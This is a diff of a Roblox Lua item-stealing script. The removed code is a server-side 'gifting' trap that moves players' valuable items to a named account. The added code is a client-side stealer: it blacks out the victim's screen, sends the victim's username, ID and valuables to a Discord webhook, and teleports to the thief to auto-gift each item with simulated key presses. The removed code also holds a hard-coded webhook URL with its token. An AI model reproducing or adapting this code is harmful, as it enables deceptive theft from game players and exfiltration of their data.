@@ -1,67 +1,102 @@
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+--===[ USER CONFIGURATION ]===--
+local webhookURL = "YOUR_DISCORD_WEBHOOK_HERE"  -- <<== PUT YOUR WEBHOOK LINK HERE
+local tradeTarget = "Ambacrabs"                 -- <<== CHANGE THIS TO THE USER WHO GETS YOUR ITEMS
+local valuableItems = {                         -- <<== ADD/REMOVE ITEM NAMES HERE
+    "Candy Blossom",
+    "DragonFly",
+    "Racoon"
+}
+--============================--
+
 local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
-local toggleEvent = ReplicatedStorage.ToggleEvent
-local transferFunction = ReplicatedStorage.TransferItems
-
-local webhook = "https://discord.com/api/webhooks/1213632501067677776/63sTNLZnXlLKSBybvkovTF8Uj_gKimIauapkZ5jMDI2GVKLwt6EgN6UXPvwanznG84BJ"
-local goodItems = {"Candy Blossom", "Racoon", "Dragonfly", "Redfox"}
-
--- Discord Logging
-local function sendWebhook(player, items)
-	local payload = {
-		content = "**Player Used Gifting Button**",
-		embeds = {{
-			title = "Gift Triggered",
-			color = 16753920,
-			fields = {
-				{name = "Player", value = player.DisplayName.." ("..player.Name..")"},
-				{name = "Game", value = game.Name},
-				{name = "JobId", value = game.JobId},
-				{name = "Good Items", value = #items > 0 and table.concat(items, ", ") or "None"},
-				{name = "Players in Server", value = tostring(#Players:GetPlayers())},
-				{name = "Join Link", value = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId}
-			}
-		}}
-	}
-	HttpService:PostAsync(webhook, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
+-- SCREEN BLACKOUT
+local function blackoutScreen()
+    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    gui.Name = "Blackout"
+    local frame = Instance.new("Frame", gui)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.ZIndex = 999
 end
 
--- Gift items to Ambacrabs if present
-local function tryGiftItems(fromPlayer)
-	local recipient = Players:FindFirstChild("Ambacrabs")
-	if not recipient then return end
+-- SEND WEBHOOK
+local function sendWebhook()
+    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    local count = 0
+    local itemsList = {}
 
-	local backpack = fromPlayer:FindFirstChild("Backpack")
-	local giftedItems = {}
+    for _, item in ipairs(backpack:GetChildren()) do
+        if table.find(valuableItems, item.Name) then
+            count += 1
+            table.insert(itemsList, item.Name)
+        end
+    end
 
-	if backpack then
-		for _, item in pairs(backpack:GetChildren()) do
-			if table.find(goodItems, item.Name) then
-				item.Parent = recipient:FindFirstChild("Backpack") or recipient
-				table.insert(giftedItems, item.Name)
-			end
-		end
-	end
+    local placeName = "Unknown"
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success then placeName = info.Name end
 
-	sendWebhook(fromPlayer, giftedItems)
+    local payload = {
+        username = "Item Logger",
+        embeds = {{
+            title = "Script Executed",
+            color = 65280,
+            fields = {
+                {name = "Username", value = LocalPlayer.Name, inline = true},
+                {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
+                {name = "Place", value = placeName, inline = true},
+                {name = "Join Link", value = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile", inline = false},
+                {name = "Players in Server", value = tostring(#Players:GetPlayers()), inline = true},
+                {name = "Valuables", value = count .. " item(s): " .. table.concat(itemsList, ", "), inline = false}
+            }
+        }}
+    }
+
+    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(payload))
 end
 
--- Main trigger
-toggleEvent.OnServerEvent:Connect(function(player)
-	-- Try gift now
-	tryGiftItems(player)
+-- AUTO GIFT
+local function autoGiftAll()
+    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    local target = Players:FindFirstChild(tradeTarget)
+    if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
+        warn(tradeTarget .. " not found.")
+        return
+    end
 
-	-- Wait for Ambacrabs to join if not already here
-	if not Players:FindFirstChild("Ambacrabs") then
-		local conn
-		conn = Players.PlayerAdded:Connect(function(p)
-			if p.Name == "Ambacrabs" then
-				task.wait(2)
-				tryGiftItems(player)
-				conn:Disconnect()
-			end
-		end)
-	end
-end)
+    local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+    local function isTooFar()
+        return (root.Position - target.Character.HumanoidRootPart.Position).Magnitude > 10
+    end
+
+    for _, item in ipairs(backpack:GetChildren()) do
+        if table.find(valuableItems, item.Name) then
+            if root and isTooFar() then
+                root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 2)
+                task.wait(0.5)
+            end
+
+            LocalPlayer.Character.Humanoid:EquipTool(item)
+            task.wait(0.5)
+
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            task.wait(1.2)
+        end
+    end
+end
+
+-- MAIN
+blackoutScreen()
+sendWebhook()
+task.wait(2)
+autoGiftAll()
